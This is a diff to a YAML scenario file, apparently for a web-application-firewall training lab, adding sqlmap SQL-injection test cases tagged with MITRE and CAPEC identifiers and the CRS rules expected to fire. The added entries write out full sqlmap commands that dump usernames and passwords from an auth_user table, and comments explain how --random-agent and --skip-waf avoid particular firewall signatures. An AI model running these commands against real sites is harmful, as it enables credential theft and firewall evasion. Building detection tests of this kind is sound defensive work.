@@ -73,8 +73,21 @@
          "-D", "board", "-T", "auth_user", "-C", "username,password",
          "--dump", "--batch", "--answers=crack=N", "--flush-session"]
 
-# The stock run with a browser User-Agent: CRS 913100 no longer names the
-# scanner, and the payloads are the same, so the 942 rules still decide.
+# Lesson 5's first sqlmap run as the learner types it: the injection test
+# alone, sqlmap's own User-Agent, no dump. CRS 913100 names the scanner.
+- name: board-sqli-orderby-sqlmap-probe
+  malicious: true
+  stage: initial-compromise
+  technique: T1190
+  pattern: CAPEC-66
+  expect: "SQL"
+  correlation: marker
+  tool: sqlmap
+  args: ["-u", "{target}/?sort=posts_post.id*", "--dbms=mysql", "--technique=BT",
+         "--level=5", "--risk=3", "--batch", "--flush-session"]
+
+# The same test with a browser User-Agent: 913100 no longer names the scanner,
+# and the payloads are the same, so the 942 rules still decide.
 - name: board-sqli-orderby-sqlmap-random-agent
   malicious: true
   stage: initial-compromise
@@ -83,8 +96,22 @@
   expect: "SQL"
   correlation: marker
   tool: sqlmap
-  args: ["-u", "{target}/?sort=posts_post.id*",
-         "--technique=BT", "--level=5", "--risk=3", "--dbms=mysql", "--random-agent",
+  args: ["-u", "{target}/?sort=posts_post.id*", "--dbms=mysql", "--technique=BT",
+         "--level=5", "--risk=3", "--batch", "--flush-session", "--random-agent"]
+
+# Lesson 6's dump through an over-broad exclusion: a browser User-Agent, and
+# --skip-waf so sqlmap sends no WAF-detection probe of its own, which would
+# trip the XSS and traversal signatures that still cover other parameters.
+- name: board-sqli-orderby-sqlmap-skip-waf
+  malicious: true
+  stage: initial-compromise
+  technique: T1190
+  pattern: CAPEC-66
+  expect: "SQL"
+  correlation: marker
+  tool: sqlmap
+  args: ["-u", "{target}/?sort=posts_post.id*", "--dbms=mysql", "--technique=BT",
+         "--level=5", "--risk=3", "--random-agent", "--skip-waf",
          "-D", "board", "-T", "auth_user", "-C", "username,password",
          "--dump", "--batch", "--answers=crack=N", "--flush-session"]
 
